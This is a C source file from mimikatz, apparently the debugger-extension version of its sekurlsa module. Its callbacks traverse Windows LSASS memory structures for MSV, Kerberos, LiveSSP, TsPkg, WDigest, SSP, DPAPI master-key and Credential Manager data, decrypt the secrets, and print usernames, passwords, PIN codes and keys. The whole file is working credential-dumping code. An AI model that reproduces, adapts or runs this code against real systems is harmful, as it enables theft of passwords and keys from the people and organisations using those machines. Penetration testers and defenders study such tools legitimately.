/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_packages.h"

const ANSI_STRING PRIMARY_STRING = {7, 8, "Primary"}, CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_MSV1_0_CREDENTIALS credentials;
	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	ULONG_PTR pPrimary, pCreds = (ULONG_PTR) pData->pCredentials;
	DWORD flags;

	while(pCreds)
	{
		if(ReadMemory(pCreds, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL))
		{
			pPrimary = (ULONG_PTR) credentials.PrimaryCredentials;
			while(pPrimary)
			{
				if(ReadMemory(pPrimary, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL))
				{
					if(kull_m_string_getDbgUnicodeString(&primaryCredentials.Credentials))
					{
						if(kull_m_string_getDbgUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary))
						{
							dprintf("\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
							else
								flags = 0;

							kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &primaryCredentials.Credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL | flags);

							LocalFree(primaryCredentials.Primary.Buffer);
						}				
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else dprintf("n.e. (Lecture KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
				pPrimary = (ULONG_PTR) primaryCredentials.next;
			}
			pCreds = (ULONG_PTR) credentials.next;
		} else dprintf("n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)");
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_KERBEROS_LOGON_SESSION session;
	UNICODE_STRING pinCode;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, &session, sizeof(KIWI_KERBEROS_LOGON_SESSION), NULL))
		{
			kuhl_m_sekurlsa_genericCredsOutput(&session.credentials, pData->LogonId, 0);
			if(session.pinCode)
				if(ReadMemory((ULONG_PTR) session.pinCode, &pinCode, sizeof(UNICODE_STRING), NULL))
					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN ULONG_PTR pLiveGlobalLogonSessionList, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_LIVESSP_LIST_ENTRY credentials;
	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(pLiveGlobalLogonSessionList, FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, &credentials, sizeof(KIWI_LIVESSP_LIST_ENTRY), NULL))
			if(ptr = (ULONG_PTR) credentials.suppCreds)
				if(ReadMemory(ptr, &primaryCredential, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL), NULL))
					kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, (NtBuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
	} else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN ULONG_PTR pTSGlobalCredTable, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_TS_CREDENTIAL credentials;
	KIWI_TS_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pTSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, &credentials, sizeof(KIWI_TS_CREDENTIAL), NULL))
			if(ReadMemory((ULONG_PTR) credentials.pTsPrimary, &primaryCredential, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), NULL))
				kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN ULONG_PTR pl_LogSessList, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	ULONG_PTR ptr;
	BYTE buffer[offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL)];
	if(ptr = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(pl_LogSessList, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, buffer, sizeof(buffer), NULL))
			kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (buffer + offsetWDigestPrimary), pData->LogonId, 0);
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN ULONG_PTR pSspCredentialList, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	if(ReadMemory(pSspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pSspCredentialList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY), NULL))
			{
				if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
				{
					dprintf("\n\t [%08x]", monNb++);
					kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_masterkeys(IN ULONG_PTR pMasterKeyCacheList, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	PBYTE buffer;

	if(ReadMemory(pMasterKeyCacheList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pMasterKeyCacheList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(KIWI_MASTERKEY_CACHE_ENTRY), NULL))
			{
				if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
				{
					dprintf("\n\t [%08x]\n\t * GUID :\t", monNb++);
					kull_m_string_displayGUID(&mesCredentials.KeyUid);
					dprintf("\n\t * Time :\t"); kull_m_string_displayFileTime(&mesCredentials.insertTime);

					if(buffer = (PBYTE) LocalAlloc(LPTR, mesCredentials.keySize))
					{						
						if(ReadMemory(ptr + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key), buffer, mesCredentials.keySize, NULL))
						{
							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer, mesCredentials.keySize);
							dprintf("\n\t * Key :\t"); kull_m_string_dprintf_hex(buffer, mesCredentials.keySize, 0);
						}
						LocalFree(buffer);
					}
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

const CREDMAN_INFOS credhelper[] = {
	{
		sizeof(KIWI_CREDMAN_LIST_ENTRY_60),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, Flink),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, user),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, server2),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, cbEncPassword),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, encPassword),
	},
	{
		sizeof(KIWI_CREDMAN_LIST_ENTRY),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, Flink),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, user),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, server2),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, cbEncPassword),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, encPassword),
	},
};

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN ULONG_PTR reserved, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_CREDMAN_SET_LIST_ENTRY setList;
	KIWI_CREDMAN_LIST_STARTER listStarter;
	DWORD nbCred = 0;
	ULONG_PTR pCur, pRef;
	KIWI_GENERIC_PRIMARY_CREDENTIAL kiwiCreds;
	ULONG CredOffsetIndex;
	PBYTE buffer;
	
	if(NtBuildNumber < KULL_M_WIN_BUILD_7)
		CredOffsetIndex = 0;
	else
		CredOffsetIndex = 1;

	if(pData->pCredentialManager)
	{
		if(ReadMemory((ULONG_PTR) pData->pCredentialManager, &setList, sizeof(KIWI_CREDMAN_SET_LIST_ENTRY), NULL))
		{
			if(setList.list1)
			{
				pRef = (ULONG_PTR) setList.list1 + FIELD_OFFSET(KIWI_CREDMAN_LIST_STARTER, start);
				if(ReadMemory((ULONG_PTR) setList.list1, &listStarter, sizeof(KIWI_CREDMAN_LIST_STARTER), NULL))
				{
					if(buffer = (PBYTE) LocalAlloc(LPTR, credhelper[CredOffsetIndex].structSize))
					{
						if(pCur = (ULONG_PTR) listStarter.start)
						{
							while(pCur != pRef)
							{
								pCur -= credhelper[CredOffsetIndex].offsetFLink;
								if(ReadMemory(pCur, buffer, credhelper[CredOffsetIndex].structSize, NULL))
								{
									dprintf("\n\t [%08x]", nbCred);
									kiwiCreds.UserName = *(PUNICODE_STRING) (buffer + credhelper[CredOffsetIndex].offsetUsername);
									kiwiCreds.Domaine = *(PUNICODE_STRING) (buffer + credhelper[CredOffsetIndex].offsetDomain);
									kiwiCreds.Password.Length = kiwiCreds.Password.MaximumLength = *(PUSHORT) (buffer + credhelper[CredOffsetIndex].offsetCbPassword);;
									kiwiCreds.Password.Buffer = *(PWSTR *) (buffer + credhelper[CredOffsetIndex].offsetPassword);
									kuhl_m_sekurlsa_genericCredsOutput(&kiwiCreds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
									pCur = (ULONG_PTR) *(PVOID *) (buffer + credhelper[CredOffsetIndex].offsetFLink);
								}
								else break;
								nbCred++;
							}
						}
						LocalFree(buffer);
					}
				}
			}
		}
	}

}